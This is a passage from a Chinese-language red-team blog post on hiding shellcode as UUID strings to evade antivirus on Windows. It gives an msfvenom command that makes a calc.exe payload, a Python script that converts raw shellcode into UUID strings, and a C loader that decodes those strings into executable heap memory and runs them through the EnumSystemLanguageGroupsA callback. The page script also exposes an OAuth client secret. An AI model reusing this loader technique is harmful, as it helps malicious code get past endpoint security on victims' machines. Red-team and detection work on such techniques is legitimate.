<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">GUID</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span>  Data1; <span class="comment">// 4字节</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> Data2; <span class="comment">// 2字节</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> Data3; <span class="comment">// 2字节</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>  Data4[<span class="number">8</span>]; <span class="comment">// 8字节</span></span><br><span class="line">&#125; GUID;</span><br></pre></td></tr></table></figure>



<p>总和一共16字节，16*8 = 128位。</p>
<h2 id="与uuid-相关的Windows-API"><a href="#与uuid-相关的Windows-API" class="headerlink" title="与uuid 相关的Windows API"></a>与uuid 相关的Windows API</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RPC_STATUS <span class="title">UuidFromString</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  RPC_CSTR StringUuid,</span></span></span><br><span class="line"><span class="function"><span class="params">  UUID     *Uuid</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>功能：将字符串uuid转换为uuid结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RPC_STATUS <span class="title">UuidCreate</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  UUID *Uuid</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>功能：创建UUID结构。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">UuidEqual</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  UUID       *Uuid1,</span></span></span><br><span class="line"><span class="function"><span class="params">  UUID       *Uuid2,</span></span></span><br><span class="line"><span class="function"><span class="params">  RPC_STATUS *Status</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>功能：判断两个UUID是否相等。</p>
<p>UUID 代表了 -&gt; <code>typedef GUID UUID;</code></p>
<h2 id="uuid-测试"><a href="#uuid-测试" class="headerlink" title="uuid 测试"></a>uuid 测试</h2><p>生成 shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;msfvenom -p windows&#x2F;exec CMD&#x3D;calc.exe -b &#39;\xfc\xe8&#39; -f raw -o &#x2F;tmp&#x2F;shellcode.bin</span><br></pre></td></tr></table></figure>

<p>bin2uuid</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> UUID</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Usage: python3 binToUUIDs.py shellcode.bin [--print]</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  ____  _    _______    _    _ _    _ _____ _____       </span></span><br><span class="line"><span class="string"> |  _ \(_)  |__   __|  | |  | | |  | |_   _|  __ \      </span></span><br><span class="line"><span class="string"> | |_) |_ _ __ | | ___ | |  | | |  | | | | | |  | |___  </span></span><br><span class="line"><span class="string"> |  _ &lt;| | &#x27;_ \| |/ _ \| |  | | |  | | | | | |  | / __| </span></span><br><span class="line"><span class="string"> | |_) | | | | | | (_) | |__| | |__| |_| |_| |__| \__ \ </span></span><br><span class="line"><span class="string"> |____/|_|_| |_|_|\___/ \____/ \____/|_____|_____/|___/</span></span><br><span class="line"><span class="string">\n&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>], <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">2</span>] == <span class="string">&quot;--print&quot;</span>:</span><br><span class="line">    outputMapping = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    outputMapping = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Length of shellcode: &#123;&#125; bytes\n&quot;</span>.format(len(bin)))</span><br><span class="line"></span><br><span class="line">out = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(offset &lt; len(bin)):</span><br><span class="line">    countOfBytesToConvert = len(bin[offset:])</span><br><span class="line">    <span class="keyword">if</span> countOfBytesToConvert &lt; <span class="number">16</span>:</span><br><span class="line">        ZerosToAdd = <span class="number">16</span> - countOfBytesToConvert</span><br><span class="line">        byteString = bin[offset:] + (<span class="string">b&#x27;\x00&#x27;</span>* ZerosToAdd)</span><br><span class="line">        uuid = UUID(bytes_le=byteString)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        byteString = bin[offset:offset+<span class="number">16</span>]</span><br><span class="line">        uuid = UUID(bytes_le=byteString)</span><br><span class="line">    offset+=<span class="number">16</span></span><br><span class="line"></span><br><span class="line">    out += <span class="string">&quot;\&quot;&#123;&#125;\&quot;,\n&quot;</span>.format(uuid)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> outputMapping:</span><br><span class="line">        print(<span class="string">&quot;&#123;&#125; -&gt; &#123;&#125;&quot;</span>.format(byteString, uuid))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>] + <span class="string">&quot;UUIDs&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(out)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Outputted to: &#123;&#125;&quot;</span>.format(sys.argv[<span class="number">1</span>] + <span class="string">&quot;UUIDs&quot;</span>))</span><br></pre></td></tr></table></figure>



<p>生成测试样本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;Rpcrt4.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * buf[] = &#123;</span><br><span class="line">	<span class="string">&quot;4baf01bd-dbdd-d9de-7424-f45a33c9b131&quot;</span>,</span><br><span class="line">	<span class="string">&quot;83136a31-04c2-6a03-0e4d-be21f81341da&quot;</span>,</span><br><span class="line">	<span class="string">&quot;3fcb73f8-b3c9-34af-7904-bb1975efe989&quot;</span>,</span><br><span class="line">	<span class="string">&quot;bd259d0e-28a7-f010-3800-6093ba5bb573&quot;</span>,</span><br><span class="line">	<span class="string">&quot;72c89383-cec4-2621-9d85-94d7aad02453&quot;</span>,</span><br><span class="line">	<span class="string">&quot;802cf5e0-f4b0-171d-cbae-bd9918dbf781&quot;</span>,</span><br><span class="line">	<span class="string">&quot;394ee67d-9cb5-eb50-845d-fed229acfe13&quot;</span>,</span><br><span class="line">	<span class="string">&quot;6a754f8d-f2ee-a98e-8d28-1a2a35babc96&quot;</span>,</span><br><span class="line">	<span class="string">&quot;5c5a6fc4-c4ca-3a28-cedb-fd30ea500097&quot;</span>,</span><br><span class="line">	<span class="string">&quot;3327227b-f020-6246-8c57-76746f07d2fe&quot;</span>,</span><br><span class="line">	<span class="string">&quot;5d6f5c9d-a3cb-dbfd-b9a4-fde3edcccc68&quot;</span>,</span><br><span class="line">	<span class="string">&quot;bad08a62-64c7-e79b-61ed-4272307075a8&quot;</span>,</span><br><span class="line">	<span class="string">&quot;59f68d76-6a06-2be6-0336-a0c0792745e7&quot;</span>,</span><br><span class="line">	<span class="string">&quot;844c482e-dab1-650c-545b-b67900000000&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> dwNum = <span class="keyword">sizeof</span>(buf) / <span class="keyword">sizeof</span>(buf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	HANDLE hMemory = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hMemory == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	PVOID pMemory = HeapAlloc(hMemory, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line">	</span><br><span class="line">	DWORD_PTR CodePtr = (DWORD_PTR)pMemory;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; dwNum; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (CodePtr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		RPC_STATUS	status = UuidFromStringA(RPC_CSTR(buf[i]), (UUID*)CodePtr);</span><br><span class="line">		<span class="keyword">if</span> (status != RPC_S_OK) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		CodePtr += <span class="number">16</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pMemory == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)pMemory, LGRPID_INSTALLED, <span class="literal">NULL</span>) == FALSE) &#123;</span><br><span class="line">		<span class="comment">// 加载成功</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Windows-CALL-BACK-函数"><a href="#Windows-CALL-BACK-函数" class="headerlink" title="Windows CALL BACK 函数"></a>Windows CALL BACK 函数</h2><p>CALL BACK意为回调，是定义一个函数，由系统某个事件或用户的动作自动触发的函数，因此调用者不是用户。</p>
<p>例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">HINTERNET hOpen;                       <span class="comment">// Root HINTERNET handle</span></span><br><span class="line">INTERNET_STATUS_CALLBACK iscCallback;  <span class="comment">// Holds the callback function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Create the root HINTERNET handle.</span></span><br><span class="line">hOpen = InternetOpen( TEXT(<span class="string">&quot;Test Application&quot;</span>),</span><br><span class="line">                      INTERNET_OPEN_TYPE_PRECONFIG,</span><br><span class="line">                      <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set the status callback function.</span></span><br><span class="line">iscCallback = InternetSetStatusCallback( hOpen, (INTERNET_STATUS_CALLBACK)CallMaster );</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> CALLBACK <span class="title">CallMaster</span><span class="params">( HINTERNET,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD_PTR,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果CallMaster指向的是一块可执行属性的内存，那么就可以加载Shellcode。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>如果真要走红队免杀这块，Windows 核心编程、Windows 操作系统相关的东西那必须非常熟练才行。</p>
<p>路漫漫……不要急于求成……</p>
<p>代码都没有本地测试，只是先了解了一下常见的方法。明天或者有空了在虚拟机里面用vs测试。mac版的vs没法编译c/c++。clion 也没有，没有 windows.h 这个头文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210220232131.png"></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/bd13.html">https://hack-for.fun/bd13.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a></div><div class="social-share pull-right" data-disabled="google,facebook"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/49b7.html"><i class="fa fa-chevron-left">  </i><span>如何防止溯源以及反溯源</span></a></div><div class="next-post pull-right"><a href="/9316.html"><span>漏洞复现：S2-059&amp;061远程代码执行漏洞(CVE-2019-0230&amp;CVE-2020-17430)</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
  clientID: '6ceed9c245da8d33222a',
  clientSecret: '143c0add0301972b963c8f672bf4e58a092673fb',
  repo: 'Gitalk',
  owner: 'ifonly-go2019',
  admin: 'ifonly-go2019',
  id: md5(decodeURI(location.pathname)),
  language: 'zh-CN'
})
gitalk.render('gitalk-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2022 By m0nk3y</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>